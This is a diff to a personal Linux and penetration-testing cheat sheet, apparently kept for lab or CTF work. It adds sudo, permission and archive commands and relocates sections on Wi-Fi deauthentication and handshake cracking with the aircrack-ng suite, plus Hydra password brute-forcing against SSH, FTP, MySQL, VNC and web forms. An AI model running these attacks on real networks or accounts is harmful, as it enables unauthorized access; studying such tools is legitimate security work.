@@ -64,13 +64,29 @@ sudo passwd -u username
 ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555 #(ssh portforwarding for adb in mobile)
 ```
 
-for adding a ssh user:
+for adding a new user:
 ----------------------------
 ```
 sudo adduser cyber
 sudo usermod -aG sudo cyber
 nano /etc/sudoers    #(adding user to sudoers file to get su permission)
 usrname  ALL=(ALL:ALL) ALL
+```
+searching and removing user from using sudo and giving file permissions:
+--------------------------------------------------------------------------------------
+```
+sudo gpasswd -d username sudo (to remove sudo permisson of anyuser)
+getent group sudo (to list the sudo users in sudo group)
+
+nano /etc/sudoers    (adding user to sudoers file to get su permission)
+username  ALL=(ALL:ALL) ALL (giving all executable permissions)
+
+sudo chown -R kali:www-data html
+sudo chmod -R 750 folder (to remove forbidden access)
+sudo chmod g+w /var/www/html/*.php /var/www/html/*.html
+
+sudo chmod 775 test.sh
+sudo chown tennyson:tennyson test.sh
 ```
 
 Stabilizing the reverse shell:
@@ -90,6 +106,55 @@ Converting ova to vmdk and other extensions:
 tar xvf HF2019-Linux.ova #(unziping ova file)
 ./VBoxManage clonehd "S:\HF2019-Linux.ova\HF2019-Linux\HF2019-Linux-disk001.vdi" S:\HF2019-Linux.ova\vmdk\disk.vmdk --format VMDK
 ```
+
+All cmds on extracting and compressig:
+--------------------------------------------------------------------------------------
+# zip
+```
+zip archive.zip file1 file2 directory1
+unzip archive.zip (to extract .zip)
+```
+# tar compression
+```
+tar -cvf archive.tar file1 file2 directory1
+tar -cvzf archive.tar.gz file1 file2 directory1
+tar -cvjf archive.tar.bz2 file1 file2 directory1
+tar -cvJf archive.tar.xz file1 file2 directory1
+```
+# tar extraction
+```
+tar -xvf archive.tar
+tar -xzvf archive.tar.gz
+tar -xjvf archive.tar.bz2
+tar -xJvf archive.tar.xz
+```
+# gzip
+```
+gzip file.txt
+gunzip file.txt.gz (to extract .gz)
+```
+# bzip2
+```
+bzip2 file.txt
+bunzip2 file.txt.bz2 (to extract .bz2)
+```
+# xz file.txt
+```
+xz file.txt
+unxz file.txt.xz (to extract .xz)
+``` 
+# 7z
+```
+7z a archive.7z file1 file2 directory1
+7za x archive.7z (to extract .7z)
+
+```
+# rar
+```
+rar a archive.rar file1 file2 directory1
+unrar x archive.rar  (to extract .rar)
+```
+
 
 
 Manual assigning of ipv4 to wlan0
@@ -114,6 +179,38 @@ apt install vsftpd
 systemctl start vsftpd
 systemctl enable vsftpd
 systemctl status vsftpd
+```
+
+
+wireless hacking
+------------------------------------------------------------------------------------
+```
+sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
+sudo airodump-ng wlan0mon #(Start capturing traffic:)
+sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
+sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
+```
+
+Crack the handshake:
+--------------------------------------------
+```
+sudo aircrack-ng -w wordlist.txt -b [BSSID] outputfile.cap 
+aircrack-ng outputfile.cap #(Identify Handshake or get bssid)
+aircrack-ng -w wordlist.txt outputfile.cap #(direct crack)
+```
+Hydra all brute force commands:
+--------------------------------------------------------------------------------------------
+```
+note "-P" capital for passwordlists if it is only single password use small "-p"
+hydra -l <username> -P <passwords_file> <target_ip> ssh
+hydra -l <username> -P <passwords_file> <target_ip> ftp
+hydra -l <username> -P <passwords_file> <target_ip> mysql
+hydra -l <username> -p <password> <ip> <service> -s <port>
+hydra -V -f -P '/home/kali/rockyou.txt'  10.10.7.91 vnc (without username)
+hydra -C <combinations.txt> <ip> <service>
+hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
+hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
+hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
 ```
 
 wireshark packet filters:
@@ -184,32 +281,3 @@ ssl.handshake: Filters SSL handshake packets.
 ssl.record.content_type == 23: Filters SSL application data packets.
 ```
 
-wireless hacking
-------------------------------------------------------------------------------------
-```
-sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
-sudo airodump-ng wlan0mon #(Start capturing traffic:)
-sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
-sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
-```
-
-Crack the handshake:
---------------------------------------------
-```
-sudo aircrack-ng -w wordlist.txt -b [BSSID] outputfile.cap 
-aircrack-ng outputfile.cap #(Identify Handshake or get bssid)
-aircrack-ng -w wordlist.txt outputfile.cap #(direct crack)
-```
-Hydra all brute force commands:
---------------------------------------------------------------------------------------------
-```
-note "-P" capital for passwordlists if it is only single password use small "-p"
-hydra -l <username> -P <passwords_file> <target_ip> ssh
-hydra -l <username> -P <passwords_file> <target_ip> ftp
-hydra -l <username> -P <passwords_file> <target_ip> mysql
-hydra -l <username> -p <password> <ip> <service> -s <port>
-hydra -C <combinations.txt> <ip> <service>
-hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
-hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
-hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
-```
